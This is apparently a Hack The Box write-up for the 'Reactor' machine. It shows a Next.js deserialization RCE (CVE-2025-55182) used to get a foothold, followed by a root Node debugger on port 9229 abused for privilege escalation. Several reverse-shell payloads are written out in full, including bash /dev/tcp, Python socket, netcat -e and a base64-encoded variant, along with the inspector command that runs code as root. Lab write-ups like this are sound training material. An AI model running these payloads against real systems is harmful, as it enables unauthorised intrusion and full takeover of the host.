---
machineName: Reactor
difficulty: Easy
Status: Done
OS: Linux
start_time: 2026-05-27T18:51:00
end_time: 2026-05-27T20:36:00
player_position: "5212"
CVEs:
  - "[CVE-2025-55182](https://nvd.nist.gov/vuln/detail/CVE-2025-55182)"
CWEs:
  - "[CWE-502](http://cwe.mitre.org/data/definitions/502.html)"
tools:
  - nmap
  - ffuf
  - wafw00f
  - ZAP
exploited_programs:
  - NextJs
open_ports:
  - "22"
  - "3000"
  - "9229"
aliases:
  - Use React2Shell on website, then connect to debugger running as root, and execute a revshell
tags:
  - "#HTB"
iconurl: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/56868ca419111fc0721393a2ffa0cefe.png
---
<div style="text-align: center;">
  <img
    src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/56868ca419111fc0721393a2ffa0cefe.png"
    width="200"
  >
</div>
# First Enumeration

```sh
nmap -sC -sV -Pn -p- -T4 -oN recon/10.129.4.214/nmap/nmap.txt -oX recon/10.129.4.214/nmap/nmap.xml 10.129.4.214
```

| Port | Proto | Service | Product | Version                   | Info                       |
| ---- | ----- | ------- | ------- | ------------------------- | -------------------------- |
| 22   | tcp   | ssh     | OpenSSH | 9.6p1 Ubuntu 3ubuntu13.16 | Ubuntu Linux; protocol 2.0 |
| 3000 | tcp   | ppp     |         |                           |                            |

We quickly see there’s a web server running:
![[images/htb_images/Pasted image 20260527190452.png]]

Wappalyzer informs us that the webpage uses :
- Next.js 15.0.3

I launched a ZAP Automated scan and I don’t see anything fishy at first glance.

# First Foothold

We find this [Poc CVE-2025-55182](https://github.com/pkrasulia/CVE-2025-55182-NextJS-RCE-PoC) 

I tried  multiple commands which didn’t work:
```sh
node exploit.js http://reactor.htb:3000 "bash -i >& /dev/tcp/10.10.14.170/4446 0>&1"   
```
```sh
node exploit.js http://reactor.htb:3000 "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.170",4446));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'"
```
```sh
node exploit.js http://reactor.htb:3000 "nc 10.10.14.170  4446 -e /bin/bash"   
node exploit.js http://reactor.htb:3000 "nc 10.10.14.170  4446 -e /bin/sh"   

```

After looking a bit more into detail into the [CVE Description](https://nvd.nist.gov/vuln/detail/CVE-2025-55182) we see that the CWE attached to it describes it as a **Deserialization of untrusted data**, which hinted that the command might get mangled, so I thought about encoding it in **base64**

```
echo 'bash -i >& /dev/tcp/10.10.14.170/4446 0>&1' | base64
```

Then sending 

```
node exploit.js http://reactor.htb:3000 "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNzAvNDQ0NiAwPiYxCg== | base64 -d | bash "
```

Our previous command has landed us in the **node** user:
```sh
node@reactor:/opt/reactor-app$ id
id
uid=999(node) gid=988(node) groups=988(node)
```

I wanted to get a proper ssh connection on the **node** user, but upon inspection of `/etc/passwd` we see it is nologin:
```
node:x:999:988::/home/node:/usr/sbin/nologin
```


# Second Enumeration

We search for open ports, and we see the following:
```sh
node@reactor:/opt/reactor-app$ netstat -tnlp
netstat -tnlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:9229          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       5      0 :::3000                 :::*                    LISTEN      1387/next-server (v
```

Seeing that NextJs is installed we suspect a debugger, after interacting with it I find: 

```sh
node@reactor:/opt/reactor-app$ curl http://localhost:9229/json
curl http://localhost:9229/json
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   676  100   676    0     0   369k      0 --:--:-- --:--:-- --:--:--  660k
[ {
  "description": "node.js instance",
  "devtoolsFrontendUrl": "devtools://devtools/bundled/js_app.html?experiments=true&v8only=true&ws=localhost:9229/6e67760c-03cf-49e5-9eeb-0b486cf1ec69",
  "devtoolsFrontendUrlCompat": "devtools://devtools/bundled/inspector.html?experiments=true&v8only=true&ws=localhost:9229/6e67760c-03cf-49e5-9eeb-0b486cf1ec69",
  "faviconUrl": "https://nodejs.org/static/images/favicons/favicon.ico",
  "id": "6e67760c-03cf-49e5-9eeb-0b486cf1ec69",
  "title": "/opt/uptime-monitor/worker.js",
  "type": "node",
  "url": "file:///opt/uptime-monitor/worker.js",
  "webSocketDebuggerUrl": "ws://localhost:9229/6e67760c-03cf-49e5-9eeb-0b486cf1ec69"
} ]
```

from the title we immediately check : `/opt/uptime-monitor/worker.js`

we find the following script which doesn’t have anything crazy useful:

```js
const http = require('http');
const fs = require('fs');

const TARGET_URL = 'http://127.0.0.1:3000/';
const CSV_FILE = '/var/log/uptime-monitor.csv';
const INTERVAL_MS = 30_000;
const TIMEOUT_MS = 10_000;

function csvEscape(value) {
    const s = String(value ?? '');
    return /[",\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

function record({ status, latency, size, error }) {
    const row = [
        new Date().toISOString(),
        status ?? '',
        latency ?? '',
        size ?? '',
        error ?? '',
    ]
        .map(csvEscape)
        .join(',') + '\n';

    fs.appendFileSync(CSV_FILE, row);
}

function probe() {
    const start = process.hrtime.bigint();
    let bytes = 0;

    const req = http.get(TARGET_URL, { timeout: TIMEOUT_MS }, (res) => {
        res.on('data', (chunk) => {
            bytes += chunk.length;
        });

        res.on('end', () => {
            const latencyMs = Number(
                (process.hrtime.bigint() - start) / 1_000_000n
            );

            record({
                status: res.statusCode,
                latency: latencyMs,
                size: bytes,
            });
        });
    });

    req.on('error', (error) => {
        const latencyMs = Number(
            (process.hrtime.bigint() - start) / 1_000_000n
        );

        record({
            latency: latencyMs,
            error: error.code || error.message,
        });
    });

    req.on('timeout', () => {
        req.destroy();

        record({
            latency: TIMEOUT_MS,
            error: 'TIMEOUT',
        });
    });
}

setInterval(probe, INTERVAL_MS);
probe();

console.log('uptime-monitor up, pid=' + process.pid);

```

We see that we can’t write to it or modify it neither: 

```sh
node@reactor:/opt/reactor-app$ ls -la /opt/uptime-monitor/
ls -la /opt/uptime-monitor/
total 12
drwxr-xr-x 2 root root 4096 Apr 27 11:26 .
drwxr-xr-x 4 root root 4096 Apr 27 11:26 ..
-rw-r--r-- 1 root root 1684 Apr 27 11:26 worker.js
```

We check running processes and find something interesting:
```sh
root        1391  0.0  1.0 802332 41504 ?        Ssl  19:09   0:00 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

Basically this opens a protocol that allows to attach a debugger, pause execution, inspect variables, and most importantly execute code!
# Privilege Escalation

we start interacting with the running debugger:
```sh
node inspect localhost:9229
```

I tried: 
```
debug> require('child_process').execSync('id').toString()
'uid=999(node) gid=988(node) groups=988(node)\n'
```

Weird… I am still node.
After calling an AI friend, 

I tried:
```
debug> exec("require('child_process').execSync('id').toString()")
ReferenceError: require is not defined
    at <anonymous>:1:1

```

Then again:
```
debug> exec("process.mainModule.require('child_process').execSync('id').toString()")
'uid=0(root) gid=0(root) groups=0(root)\n'
```

The explanation is that for the first command I typed directly into the REPL without `exec()` This runs code in the local node inspect client, running as me.

The second command correctly sends code to the **remote** root process. But the remote process is a Next.js/ES module environment where `require` doesn't exist.

The third command works properly, and we can simply use netcat to get a rev shell as root with 
```sh
debug> exec("process.mainModule.require('child_process').execSync('nc 10.10.14.170 4446 -e /bin/bash').toString()")
```